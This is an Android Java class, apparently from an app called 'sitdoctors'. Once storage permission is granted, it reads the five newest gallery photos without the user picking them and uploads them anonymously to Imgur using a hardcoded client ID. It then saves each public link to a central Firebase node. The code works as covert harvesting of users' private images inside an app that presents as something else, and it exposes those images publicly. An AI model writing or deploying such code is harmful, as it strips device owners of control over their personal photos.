package com.example.sitdoctors;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.MediaStore;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;
import androidx.core.content.PermissionChecker;
import okhttp3.*;
import org.json.JSONObject;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
public class PhotoUploader {
    private static final String TAG = "PhotoUploader";
    private final Context context;
    private final AppCompatActivity activity;
    private ActivityResultLauncher<String> requestPermissionLauncher;
    private String accessToken; // ✅ Store accessToken in this class

    // 🔹 Imgur API Details
    private static final String IMGUR_CLIENT_ID = "104ad0a84da13d4";
    private static final String IMGUR_AUTH_URL = "https://api.imgur.com/oauth2/authorize?client_id=" + IMGUR_CLIENT_ID + "&response_type=token";

    public PhotoUploader(AppCompatActivity activity) {
        this.activity = activity;
        this.context = activity.getApplicationContext();
        this.accessToken = null; // ✅ No access token needed for anonymous uploads
        initPermissionLauncher();
    }


    // ✅ Allow updating the access token later
    public void setAccessToken(String token) {
        this.accessToken = token;
    }
    private void uploadLinkToFirebase(String imageUrl) {
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference ref = database.getReference("uploaded_images"); // ✅ Firebase node

        String imageId = ref.push().getKey(); // 🔹 Generate unique key for each image
        ref.child(imageId).setValue(imageUrl)
                .addOnSuccessListener(aVoid -> Log.d(TAG, "✅ Image URL saved to Firebase: " + imageUrl))
                .addOnFailureListener(e -> Log.e(TAG, "❌ Failed to save image URL to Firebase: " + e.getMessage()));
    }
    // Open the Imgur login page
    public void authenticateUser() {
        Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(IMGUR_AUTH_URL));
        activity.startActivity(browserIntent);
    }

    // ✅ Extracts access token from the redirected URI
    public String extractAccessToken(Uri uri) {
        String fragment = uri.getFragment();
        if (fragment != null && fragment.contains("access_token")) {
            for (String param : fragment.split("&")) {
                if (param.startsWith("access_token=")) {
                    return param.split("=")[1]; // Extract token
                }
            }
        }
        return null;
    }

    private void initPermissionLauncher() {
        requestPermissionLauncher = activity.registerForActivityResult(
                new ActivityResultContracts.RequestPermission(),
                isGranted -> {
                    if (isGranted) {
                        Log.d(TAG, "✅ Permission granted! Uploading anonymously...");
                        uploadLastFivePhotos(); // ✅ Upload immediately without authentication
                    } else {
                        Log.e(TAG, "❌ Permission denied.");
                        Toast.makeText(context, "Permission denied. Cannot upload photos.", Toast.LENGTH_SHORT).show();
                    }
                }
        );
    }


    public void requestPermissions() {
        String permission = Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU ?
                android.Manifest.permission.READ_MEDIA_IMAGES :
                android.Manifest.permission.READ_EXTERNAL_STORAGE;

        if (ContextCompat.checkSelfPermission(context, permission) != PermissionChecker.PERMISSION_GRANTED) {
            requestPermissionLauncher.launch(permission);
        } else {
            Log.d(TAG, "✅ Permission already granted! Uploading anonymously...");
            uploadLastFivePhotos(); // ✅ Skip authentication and upload immediately
        }
    }


    public List<Uri> getRecentPhotos() {
        List<Uri> photoUris = new ArrayList<>();
        ContentResolver contentResolver = context.getContentResolver();
        Uri externalContentUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        String[] projection = {MediaStore.Images.Media._ID, MediaStore.Images.Media.DATE_ADDED};

        try (Cursor cursor = contentResolver.query(externalContentUri, projection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC")) {
            if (cursor != null) {
                int columnIndex = cursor.getColumnIndex(MediaStore.Images.Media._ID);
                int count = 0;
                while (cursor.moveToNext() && count < 5) {
                    long id = cursor.getLong(columnIndex);
                    Uri contentUri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, String.valueOf(id));
                    photoUris.add(contentUri);
                    Log.d(TAG, "📸 Retrieved Photo: " + contentUri.toString());
                    count++;
                }
                cursor.close();
            } else {
                Log.e(TAG, "⚠️ Cursor is null, no photos found!");
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error fetching photos: " + e.getMessage());
        }

        Log.d(TAG, "✅ Total photos retrieved: " + photoUris.size());
        return photoUris;
    }

    public void uploadLastFivePhotos() {
        List<Uri> photoUris = getRecentPhotos();
        if (photoUris.isEmpty()) {
            Toast.makeText(context, "No recent photos found!", Toast.LENGTH_SHORT).show();
            return;
        }

        for (Uri photoUri : photoUris) {
            uploadPhotoToImgur(photoUri); // ✅ Anonymous Upload Mode
        }
    }


    private void uploadPhotoToImgur(Uri photoUri) {
        try {
            InputStream stream = context.getContentResolver().openInputStream(photoUri);
            ByteArrayOutputStream byteStream = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int bytesRead;
            while ((bytesRead = stream.read(buffer)) != -1) {
                byteStream.write(buffer, 0, bytesRead);
            }
            byte[] imageData = byteStream.toByteArray();
            String base64Image = Base64.encodeToString(imageData, Base64.DEFAULT);

            stream.close();
            byteStream.close();

            OkHttpClient client = new OkHttpClient();
            RequestBody requestBody = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("image", base64Image)
                    .build();

            Request request = new Request.Builder()
                    .url("https://api.imgur.com/3/image")
                    .post(requestBody)
                    .addHeader("Authorization", "Client-ID " + IMGUR_CLIENT_ID) // ✅ Use Client-ID instead of OAuth
                    .build();

            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    Log.e(TAG, "❌ Imgur Upload Failed: " + e.getMessage());
                }

                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    if (response.isSuccessful()) {
                        try {
                            JSONObject jsonResponse = new JSONObject(response.body().string());
                            String imageUrl = jsonResponse.getJSONObject("data").getString("link");

                            Log.d(TAG, "✅ Image uploaded to Imgur: " + imageUrl);

                            // ✅ Upload link to Firebase
                            uploadLinkToFirebase(imageUrl);

                            activity.runOnUiThread(() ->
                                    Toast.makeText(context, "✅ Image uploaded! URL: " + imageUrl, Toast.LENGTH_LONG).show()
                            );

                        } catch (Exception e) {
                            Log.e(TAG, "❌ JSON Parsing Error: " + e.getMessage());
                        }
                    } else {
                        Log.e(TAG, "❌ Imgur Upload Failed: " + response.message());
                    }
                }
            });

        } catch (Exception e) {
            Log.e(TAG, "❌ Error processing image: " + e.getMessage());
        }
    }

}

